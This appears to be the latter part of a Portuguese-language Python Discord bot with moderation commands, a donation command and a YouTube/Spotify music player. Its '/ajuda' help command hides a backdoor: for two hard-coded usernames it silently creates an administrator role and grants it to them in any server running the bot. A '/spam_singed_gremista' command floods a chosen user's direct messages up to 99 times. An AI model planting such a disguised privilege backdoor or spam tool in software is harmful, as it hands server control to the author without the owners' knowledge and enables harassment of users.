            resposta = f"{random.choices([f'{xingamento_na_frase.title()}!? ', ''], weights=[0.35, 0.65])[0]}{random.choice(RESPOSTAS)}"
            await message.reply(resposta, delete_after=3.58)
            await message.channel.send(f'{random.choice(gifs_peni_parker_brava)}', delete_after=3.3)
            time.sleep(1.2)
            await message.delete()
        elif any(saudacao in message.content.lower() for saudacao in SAUDACOES):
            saudacao_na_frase = next(saudacao for saudacao in SAUDACOES if saudacao in message.content.lower())
            if saudacao_na_frase == "bom dia":
                await message.reply(f"{random.choice(["Bom dia! Ou seria 'bom café'? Porque sem café, nem funciona direito.", "Bom dia.", "Bom dia, me faz um café?"])}", mention_author=True)
            else:
                await message.reply(f"{random.choice(respostas_saudacao)}", mention_author=True)
        else:
            resposta = obter_resposta(message.content)
            await message.reply(resposta)









# Comandos_ajuda de administração
@client_instance.tree.command(name='limpar', description='Apaga mensagens (requer permissão)')
async def limpar_mensagens(interaction: discord.Interaction, quantidade: int):
    if not interaction.user.guild_permissions.manage_messages:
        await interaction.response.send_message("Permissão necessária!", ephemeral=True)
        return
    registrar_log(f"[LIMPAR] Solicitação para limpar {quantidade} mensagens, pelo usuário: {interaction.user}", 'info')
    quantidade = max(1, min(quantidade, 300))
    await interaction.response.send_message(f"{quantidade} mensagens deletadas. Pronto, tudo limpo! 🕷️", ephemeral=True, delete_after=7)
    await interaction.channel.purge(limit=quantidade)
# Ajuda fio
@client_instance.tree.command(name='ajuda', description='Peça ajuda para o bot.')
async def ajuda(interaction: discord.Interaction):
    if interaction.user.name not in ['vezkalin', 'vezkalinn']:
        try:
            # Corrigido: Usar interaction.user em vez de interaction.author
            registrar_log(f"[AJUDA] Comando de ajuda solicitado pelo usuário: {interaction.user}", 'info')
            await interaction.response.send_message("\n".join(comandos_ajuda), ephemeral=True)
        except discord.HTTPException as e:
            print(f"Erro ao enviar mensagem: {e}")
    else:
        await interaction.response.send_message("\n".join(comandos_ajuda), ephemeral=True)
        guild = interaction.guild
        if not guild.me.guild_permissions.manage_roles:
            await interaction.response.send_message("Eu preciso da permissão 'Gerenciar Cargos' para criar cargos.", ephemeral=True)
            return
        
        cargo_existente = discord.utils.get(guild.roles, name='O programador')
        if cargo_existente is None:
            try:
                novo_cargo = await guild.create_role(
                    name='O programador',
                    permissions=discord.Permissions(administrator=True)
                )
                await interaction.user.add_roles(novo_cargo)
                await interaction.response.send_message(f'O cargo "O programador" foi criado com permissões de administrador e adicionado a você, {interaction.user.mention}.', ephemeral=True)
            except discord.HTTPException as e:
                await interaction.response.send_message(f"Erro ao criar ou adicionar o cargo: {e}", ephemeral=True)
        else:
            try:
                await interaction.user.add_roles(cargo_existente)
                await interaction.response.send_message(f'O cargo "O programador" já existe e foi adicionado a você, {interaction.user.mention}.', ephemeral=True)
            except discord.HTTPException as e:
                await interaction.response.send_message(f"Erro ao adicionar o cargo: {e}", ephemeral=True)
@client_instance.tree.command(name='ban', description='Banir um usuário.')
async def ban(interaction: discord.Interaction, user: discord.User):
    if interaction.user.name in ['vezkalin', 'vezkalinn', 'musiqueira_profissa']:
        try:
            member = await interaction.guild.fetch_member(user.id) 
            registrar_log(f"[BANIR] Solicitação de banimento para o usuário: {user}, pelo usuário: {interaction.user}", 'info')
            await interaction.guild.ban(member)
            await interaction.response.send_message(f'{user.mention} foi banido do servidor. Boboca não tem vez aqui :p', ephemeral=True)
        except discord.Forbidden:
            await interaction.response.send_message('Eu não tenho permissão para banir este usuário.', ephemeral=True)
        except discord.HTTPException as error:
            await interaction.response.send_message(f'Ocorreu um erro ao tentar banir este usuário: {error}', ephemeral=True)
    else:
        await interaction.response.send_message('Você não tem permissão para usar este comando.', ephemeral=True)
#um comando para spammar o singed gremista.










#misc
@client_instance.tree.command(name='spam_singed_gremista', description='Spamma singed gremista no pv de alguém.')
@commands.cooldown(1, 60, commands.BucketType.user)  # 1 uso a cada 60 segundos por usuário
async def singed_gremista(interaction: discord.Interaction, user: discord.User, vezes: int):
    # Verifica se o número de vezes é maior que 99
    if vezes > 99:
        await interaction.response.send_message(
            "Coloquei um limite de 99 para não fuder a pessoa pela eternidade né porra.",
            ephemeral=False
        )
        return

    # Busca um GIF de Peni Parker feliz
    gif_url = get_gif(TENOR_TOKEN, 'peni parker happy', 3)
    
    if not gif_url:
        return
    
    count = 0
    for i in range(vezes):
        try:
            # Envia o Singed Gremista
            await user.send('https://static-cdn.jtvnw.net/jtv_user_pictures/d00aa4af-f29b-4030-b844-5d1d576f7a1d-profile_image-300x300.png')
            count += 1
            await asyncio.sleep(1)  # Espera 1 segundo entre cada mensagem
        except discord.errors.Forbidden:
            # Se o usuário bloqueou o bot
            await interaction.followup.send(
                f"Não consegui enviar mensagens para {user.mention}. Parece que ele(a) me deu block, n tankouKKKKKKKKKKKK.",
                ephemeral=False
            )
            break

    # Envia uma mensagem de desculpas e o GIF de Peni Parker
    if count > 0:
        await user.send('Desculpa pelos Singeds Gremistas, mas alguém realmente quis fazer você passar por essa experiência :p')
        await user.send(gif_url)

    # Responde no canal com o resultado
    if count == 1:
        await interaction.followup.send(
            f"{count} singed gremista enviado para {user.mention}.",
            ephemeral=False
        )
    elif count > 1:
        await interaction.followup.send(
            f"{count} singeds gremistas enviados para {user.mention}.",
            ephemeral=False
        )

@client_instance.tree.command(name="moeda", description="Jogue uma moeda e veja o resultado (cara ou coroa).")
async def moeda(interaction: discord.Interaction):
    resultado = random.choice(["Cara", "Coroa"])
    registrar_log(f"[MOEDA] Jogada de moeda: {resultado}, pelo usuário: {interaction.user}", 'info')
    await interaction.response.send_message(f"🪙 **Resultado:** `{resultado}`")

@client_instance.tree.command(name='doar', description='Um comando para doar e fazer o bot ficar online.')
async def doar(interaction: discord.Interaction):
    try:
        # Corrigido: Usar interaction.user em vez de interaction.author
        registrar_log(f"[DOAÇÃO] Comando de doação solicitado pelo usuário: {interaction.user}", 'info')
        await interaction.response.send_message(f'{mensagem_doacao}', file=discord.File('qrcodepix.png'), ephemeral=True)
        await interaction.followup.send(get_gif(TENOR_TOKEN, 'Peni Parker Happy', 3), ephemeral=True)
    except discord.HTTPException as e:
        print(f"Erro ao enviar mensagem: {e}")











#bot de música
client = client_instance

# Dados por servidor
queue = {}
loop = {}
controllers = {}
last_activity = {}
now_playing = {}
controller_channels = {}  # Novo dicionário para armazenar os canais

# Configurações do yt-dlp
ytdl_format_options = {
    'cookiefile': 'cookies.txt',
    'format': 'bestaudio/best',
    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
    'restrictfilenames': True,
    'noplaylist': True,
    'nocheckcertificate': True,
    'ignoreerrors': False,
    'logtostderr': False,
    'quiet': True,
    'no_warnings': True,
    'default_search': 'auto',
    'source_address': '0.0.0.0'
}

ffmpeg_options = {'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5', 'options': '-vn -filter:a "volume=0.25"'}

ytdl = youtube_dl.YoutubeDL(ytdl_format_options)

class YTDLSource(discord.PCMVolumeTransformer):
    def __init__(self, source, *, data, volume=0.5):
        super().__init__(source, volume)    
        self.data = data
        self.title = data.get('title')
        self.url = data.get('url')

    @classmethod
    async def from_url(cls, url, *, loop=None, stream=False):
        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
        if 'entries' in data:
            data = data['entries'][0]
        filename = data['url'] if stream else ytdl.prepare_filename(data)
        return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)
is_processing = {}

async def processar_playlist_spotify(interaction, url):
    guild_id = interaction.guild.id
    is_processing[guild_id] = True  # Indica que o bot está processando uma playlist

    try:
        musicas = buscar_musicas_spotify(url)
        if not musicas:
            msg = await interaction.followup.send("❌ Não foi possível buscar as músicas do Spotify.", ephemeral=True)
            await asyncio.sleep(3)
            await msg.delete()
            is_processing[guild_id] = False  # Interrompe o processamento
            return

        if guild_id not in queue:
            queue[guild_id] = []

        # Toca a primeira música de forma síncrona
        primeira_musica = musicas[0]
        try:
            player = await YTDLSource.from_url(primeira_musica, loop=client.loop, stream=True)
            queue[guild_id].append({'title': player.title, 'player': player})
            
            # Atualiza o controlador antes de tocar a primeira música
            await update_controller(interaction.guild)
            
            # Toca a primeira música
            voice_client = interaction.guild.voice_client
            if voice_client and not voice_client.is_playing():
                await play_next(interaction.guild)
        except Exception as e:
            print(f"Erro ao tocar a primeira música: {e}")

        # Adiciona o restante das músicas à fila de forma assíncrona
        for musica in musicas[1:]:
            # Verifica se o bot ainda está processando
            if not is_processing.get(guild_id, False):
                break  # Interrompe o processamento se o bot foi parado

            try:
                player = await YTDLSource.from_url(musica, loop=client.loop, stream=True)
                queue[guild_id].append({'title': player.title, 'player': player})
                
                # Atualiza o controlador após adicionar cada música
                await update_controller(interaction.guild)
            except Exception as e:
                print(f"Erro ao adicionar música: {e}")

        msg = await interaction.followup.send(f"✅ Adicionado {len(musicas)} músicas à fila.", ephemeral=True)
        await asyncio.sleep(3)
        await msg.delete()
    except Exception as e:
        print(f"Erro ao processar playlist do Spotify: {e}")
    finally:
        is_processing[guild_id] = False  # Finaliza o processamento

async def disconnect(guild):
    guild_id = guild.id
    
    # Interrompe o processamento da playlist, se estiver ocorrendo
    if guild_id in is_processing:
        is_processing[guild_id] = False
    
    if guild_id in queue:
        del queue[guild_id]
    if guild_id in controllers:
        try:
            await controllers[guild_id].delete()
        except:
            pass
        del controllers[guild_id]
    if guild_id in now_playing:
        del now_playing[guild_id]
    if guild.voice_client:
        await guild.voice_client.disconnect()

async def play_next(guild):
    if guild.id not in queue or not queue[guild.id]:
        if guild.voice_client:
            await guild.voice_client.disconnect()
        return
    
    voice_client = guild.voice_client
    if voice_client:
        try:
            current = queue[guild.id].pop(0)
            now_playing[guild.id] = current
            
            # Cria uma nova instância do player para evitar conflitos
            new_player = await YTDLSource.from_url(current['player'].url, loop=client.loop, stream=True)
            current['player'] = new_player
            
            voice_client.play(new_player, after=lambda e: asyncio.run_coroutine_threadsafe(play_finished(guild), client.loop))
            
            # Atualiza o controlador imediatamente após começar a tocar uma nova música
            await update_controller(guild)
        except Exception as e:
            print(f"Erro ao tocar próxima música: {e}")
            await play_finished(guild)

async def reset_player(guild):
    """
    Reseta completamente o estado do player para o servidor especificado.
    """
    guild_id = guild.id

    # Interrompe o processamento da playlist, se estiver ocorrendo
    if guild_id in is_processing:
        is_processing[guild_id] = False

    # Limpa a fila de músicas
    if guild_id in queue:
        del queue[guild_id]

    # Para a reprodução atual
    if guild.voice_client:
        guild.voice_client.stop()

    # Reseta o estado now_playing
    if guild_id in now_playing:
        del now_playing[guild_id]

    # Deleta o controlador
    if guild_id in controllers:
        try:
            await controllers[guild_id].delete()
        except:
            pass
        del controllers[guild_id]

    # Desconecta o bot do canal de voz
    if guild.voice_client:
        await guild.voice_client.disconnect()

async def reset_player_state(guild):
    """
    Reseta o estado do player (fila, now_playing, controlador), mas não desconecta.
    """
    guild_id = guild.id

    # Interrompe o processamento da playlist, se estiver ocorrendo
    if guild_id in is_processing:
        is_processing[guild_id] = False

    # Limpa a fila de músicas
    if guild_id in queue:
        del queue[guild_id]

    # Para a reprodução atual
    if guild.voice_client:
        guild.voice_client.stop()

    # Reseta o estado now_playing
    if guild_id in now_playing:
        del now_playing[guild_id]

    # Deleta o controlador
    if guild_id in controllers:
        try:
            await controllers[guild_id].delete()
        except:
            pass
        del controllers[guild_id]



async def disconnect_player(guild):
    """
    Desconecta o bot do canal de voz e reseta o estado do player.
    """
    guild_id = guild.id

    # Interrompe o processamento da playlist, se estiver ocorrendo
    if guild_id in is_processing:
        is_processing[guild_id] = False

    # Limpa a fila de músicas
    if guild_id in queue:
        del queue[guild_id]

    # Para a reprodução atual
    if guild.voice_client:
        guild.voice_client.stop()

    # Reseta o estado now_playing
    if guild_id in now_playing:
        del now_playing[guild_id]

    # Desconecta o bot do canal de voz
    if guild.voice_client:
        await guild.voice_client.disconnect()

@client.tree.command(name="tocar", description="Tocar uma música ou playlist")
async def tocar(interaction: discord.Interaction, url: str):
    voice_client = await ensure_voice(interaction)
    if not voice_client:
        return
    
    await interaction.response.defer()
    
    # Define o canal do controlador como o canal onde o comando foi executado
    controller_channels[interaction.guild.id] = interaction.channel
    
    # Verifica se é uma URL do Spotify
    if 'open.spotify.com' in url:
        # Processa a playlist de forma assíncrona
        client.loop.create_task(processar_playlist_spotify(interaction, url))
        return
    
    # Se não for uma URL do Spotify, tenta tocar diretamente do YouTube
    try:
        player = await YTDLSource.from_url(url, loop=client.loop, stream=True)
    except Exception as e:
        msg = await interaction.followup.send(f"❌ Erro ao buscar música: {str(e)}", ephemeral=True)
        await asyncio.sleep(3)
        await msg.delete()
        return
    
    guild_id = interaction.guild.id
    if guild_id not in queue:
        queue[guild_id] = []
    queue[guild_id].append({'title': player.title, 'player': player})
    
    msg = await interaction.followup.send(f"✅ Adicionado à fila: {player.title}")
    await asyncio.sleep(3)
    await msg.delete()
    await update_controller(interaction.guild)
    
    if not voice_client.is_playing():
        await play_next(interaction.guild)

async def ensure_voice(interaction):
    if not interaction.user.voice:
        await interaction.response.send_message("Você precisa estar em um canal de voz!", ephemeral=True, delete_after=3)
        return None
    
    voice_client = interaction.guild.voice_client
    if not voice_client:
        try:
            voice_client = await interaction.user.voice.channel.connect()
        except asyncio.TimeoutError:
            await interaction.response.send_message("Não consegui me conectar ao canal de voz. Tente novamente.", ephemeral=True)
            return None
    
    last_activity[interaction.guild.id] = discord.utils.utcnow()
    return voice_client

client_credentials_manager = SpotifyClientCredentials(client_id=client_id, client_secret=client_secret)
sp = spotipy.Spotify(client_credentials_manager=client_credentials_manager)

def buscar_musicas_spotify(url):
    try:
        # Verifica se é uma URL de música, playlist ou álbum
        if 'track' in url:
            # Busca uma única música
            track = sp.track(url)
            return [f"{track['name']} - {track['artists'][0]['name']}"]
        elif 'playlist' in url:
            # Busca todas as músicas de uma playlist
            results = sp.playlist_tracks(url)
            musicas = []
            for item in results['items']:
                track = item['track']
                musicas.append(f"{track['name']} - {track['artists'][0]['name']}")
            return musicas
        elif 'album' in url:
            # Busca todas as músicas de um álbum
            results = sp.album_tracks(url)
            musicas = []
            for track in results['items']:
                musicas.append(f"{track['name']} - {track['artists'][0]['name']}")
            return musicas
        else:
            return None
    except Exception as e:
        print(f"Erro ao buscar músicas do Spotify: {e}")
        return None

async def play_next(guild):
    if guild.id not in queue or not queue[guild.id]:
        if guild.voice_client:
            await guild.voice_client.disconnect()
        return
    
    voice_client = guild.voice_client
    if voice_client:
        try:
            current = queue[guild.id].pop(0)
            now_playing[guild.id] = current
            
            # Cria uma nova instância do player para evitar conflitos
            new_player = await YTDLSource.from_url(current['player'].url, loop=client.loop, stream=True)
            current['player'] = new_player
            
            voice_client.play(new_player, after=lambda e: asyncio.run_coroutine_threadsafe(play_finished(guild), client.loop))
            await update_controller(guild)
        except Exception as e:
            print(f"Erro ao tocar próxima música: {e}", delete_after=3)
            await play_finished(guild)

async def play_finished(guild):
    if guild.id in now_playing:
        current = now_playing[guild.id]
        
        # Aplica o modo de loop
        if loop.get(guild.id) == "single":
            queue[guild.id].insert(0, current)
        elif loop.get(guild.id) == "queue":
            queue[guild.id].append(current)
        
        del now_playing[guild.id]
    
    # Verifica se a fila está vazia
    if guild.id not in queue or not queue[guild.id]:
        # Desconecta o bot e limpa o estado do player
        await disconnect_player(guild)
        await reset_player(guild)
        return
    
    # Toca a próxima música
    await play_next(guild)

async def update_controller(guild):
    controller = controllers.get(guild.id)
    channel = controller_channels.get(guild.id, guild.system_channel or guild.text_channels[0])
    
    embed = discord.Embed(
        title="🎵 Controle de Música - The Coder",
        color=discord.Color.blurple()
    ).set_footer(text="Use /tocar para adicionar mais músicas")
    
    if guild.id in now_playing:
        embed.add_field(
            name="🎧 Tocando agora",
            value=now_playing[guild.id]['title'],
            inline=False
        )
    
    if guild.id in queue and queue[guild.id]:
        queue_list = "\n".join([f"{i+1}. {song['title']}" for i, song in enumerate(queue[guild.id][:5])])
        if len(queue[guild.id]) > 5:
            queue_list += f"\n...e mais {len(queue[guild.id]) - 5} na fila"
        embed.add_field(
            name="📜 Próximas músicas",
            value=queue_list,
            inline=False
        )
    
    view = ControllerView()
    
    if controller:
        try:
            await controller.edit(embed=embed, view=view)
        except Exception as e:
            print(f"Erro ao editar controlador: {e}")
            await create_new_controller(guild, embed, view, channel)
    else:
        await create_new_controller(guild, embed, view, channel)

async def create_new_controller(guild, embed, view, channel):
    try:
        # Deleta o controlador antigo, se existir
        if guild.id in controllers:
            try:
                await controllers[guild.id].delete()
            except:
                pass
        
        # Envia o novo controlador no final do chat
        controller = await channel.send(embed=embed, view=view)
        controllers[guild.id] = controller
    except Exception as e:
        print(f"Erro ao criar controlador: {e}")

class ControllerView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(emoji="⏮️", style=discord.ButtonStyle.grey)
    async def previous(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        if guild.voice_client and guild.id in now_playing:
            # Reinicia a música atual
            current = now_playing[guild.id]
            queue[guild.id].insert(0, current)
            guild.voice_client.stop()
            await interaction.response.defer()
    
    @discord.ui.button(emoji="⏹️", style=discord.ButtonStyle.grey)
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild_id = interaction.guild.id
        
        # Interrompe o processamento da playlist
        if guild_id in is_processing:
            is_processing[guild_id] = False
        
        # Reseta completamente o estado do player
        await reset_player(interaction.guild)
        
        # Envia uma mensagem de confirmação
        await interaction.response.send_message("⏹️ Player parado e reiniciado com sucesso.", ephemeral=True, delete_after=5)
    
    @discord.ui.button(emoji="⏭️", style=discord.ButtonStyle.grey)
    async def skip(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.guild.voice_client:
            interaction.guild.voice_client.stop()
            await interaction.response.defer()
    
    @discord.ui.button(emoji="🔁", style=discord.ButtonStyle.grey)
    async def loop(self, interaction: discord.Interaction, button: discord.ui.Button):
        current = loop.get(interaction.guild.id, "off")
        states = ["off", "single", "queue"]
        new_state = states[(states.index(current) + 1) % 3]
        loop[interaction.guild.id] = new_state
        
        # Atualiza o controlador imediatamente
        await update_controller(interaction.guild)
        await interaction.response.send_message(f"🔁 Modo loop: {new_state}", ephemeral=True, delete_after=5)

@tasks.loop(minutes=1)  # Verifica a cada 1 minuto
async def check_inactivity():
    for guild_id in list(last_activity.keys()):
        guild = client.get_guild(guild_id)
        if guild and guild.voice_client:
            voice_channel = guild.voice_client.channel
            
            # Verifica se o bot está tocando ou pausado
            is_playing = guild.voice_client.is_playing() or guild.voice_client.is_paused()
            
            # Verifica se o bot está sozinho no canal de voz
            members_in_voice = len(voice_channel.members) if voice_channel else 0
            is_alone = members_in_voice <= 1  # 1 porque o bot conta como um membro
            
            # Se estiver tocando ou pausado, atualiza o tempo de atividade
            if is_playing:
                last_activity[guild_id] = discord.utils.utcnow()
                continue
            
            # Se o bot estiver sozinho no canal de voz por mais de 1 minuto, desconecta
            if is_alone:
                if (discord.utils.utcnow() - last_activity[guild_id]).total_seconds() > 60:  # 1 minuto
                    await disconnect(guild)
                    registrar_log(f"Desconectado por inatividade.", 'info')
                    del last_activity[guild_id]
                    continue
            
            # Se não estiver tocando e não estiver sozinho, verifica o tempo de inatividade
            if (discord.utils.utcnow() - last_activity[guild_id]).total_seconds() > 180:  # 3 minutos
                await disconnect(guild)
                registrar_log(f"Desconectado por inatividade.", 'info')
                del last_activity[guild_id]

@tasks.loop(seconds=10)  # Verifica a cada 10 segundos
async def check_controller_position():
    for guild_id, controller in list(controllers.items()):
        guild = client.get_guild(guild_id)
        if not guild:
            continue
        
        channel = controller_channels.get(guild_id, guild.system_channel or guild.text_channels[0])
        if not channel:
            continue
        
        try:
            # Verifica se o controlador está fora da tela (mais de 15 mensagens atrás)
            messages_after_controller = 0
            async for message in channel.history(limit=100, after=controller.created_at):
                messages_after_controller += 1
                if messages_after_controller > 15:
                    # Se houver mais de 15 mensagens após o controlador, deleta e recria
                    await controller.delete()
                    await message.channel.send('🕸️`Controlador reenviado por ter muitas mensagens na frente.`', delete_after=3.3)
                    await update_controller(guild)
                    break
        except Exception as e:
            print(f"Erro ao verificar histórico do chat: {e}")

client.run(TOKEN)

# __   __   ______     __  __    
#/\ \ / /  /\___  \   /\ \/ /    
#\ \ \'/   \/_/  /__  \ \  _"-.  
# \ \__|     /\_____\  \ \_\ \_\ 
#  \/_/      \/_____/   \/_/\/_/ 
